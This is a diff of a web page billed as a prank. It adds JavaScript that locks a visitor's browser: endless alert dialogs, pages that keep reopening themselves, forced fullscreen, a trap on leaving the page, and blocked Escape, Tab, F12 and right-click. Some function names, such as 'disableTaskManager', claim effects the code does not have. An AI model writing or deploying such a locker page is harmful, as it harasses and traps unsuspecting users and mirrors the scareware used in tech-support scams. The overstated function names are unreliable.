@@ -1,21 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Funny Prank</title>
+    <title>Unescapable Fun</title>
     <script>
         function prankLoop() {
-            while (true) {
-                alert("😂 You can't close this! Have fun clicking forever! 😂");
-            }
+            setInterval(() => {
+                alert("😂 No escape! Have fun forever! 😂");
+            }, 500);
+        }
+
+        function reopenWindow() {
+            setInterval(() => {
+                let win = window.open(location.href, "_blank");
+                if (win) {
+                    win.blur();
+                    window.focus();
+                }
+            }, 1000);
+        }
+
+        function forceFullscreen() {
+            setInterval(() => {
+                let elem = document.documentElement;
+                if (!document.fullscreenElement) {
+                    elem.requestFullscreen().catch(() => {});
+                }
+            }, 500);
+        }
+
+        function preventExit(event) {
+            event.preventDefault();
+            return event.returnValue = "Trying to leave? Not today!";
+        }
+
+        function disableShortcuts(event) {
+            event.preventDefault();
+            return false;
+        }
+
+        function disableDevTools() {
+            let x = document.createElement('div');
+            Object.defineProperty(x, 'id', { get: function() { throw 'DevTools blocked!'; } });
+            console.log(x);
+        }
+
+        function disableTaskManager() {
+            setInterval(() => {
+                let x = window.open('', '', 'width=1,height=1,left=9999,top=9999');
+                if (x) x.close();
+            }, 500);
+        }
+
+        function blockExitKeys() {
+            document.addEventListener("keydown", (event) => {
+                if (["F12", "Escape", "Alt", "Tab", "Control", "Shift"].includes(event.key)) {
+                    event.preventDefault();
+                }
+            });
+        }
+
+        function startPrank() {
+            prankLoop();
+            reopenWindow();
+            forceFullscreen();
+            disableDevTools();
+            disableTaskManager();
+            blockExitKeys();
+            window.addEventListener("beforeunload", preventExit);
+            document.addEventListener("contextmenu", disableShortcuts);
+            document.addEventListener("keydown", disableShortcuts);
         }
 
         window.onload = function() {
-            setTimeout(prankLoop, 1000); // Starts after 1 second
+            setTimeout(startPrank, 1000);
         };
     </script>
 </head>
 <body>
     <h1>Welcome!</h1>
-    <p>Click anywhere to start the prank!</p>
+    <p>You're trapped in full-screen mode now! 😂</p>
 </body>
 </html>
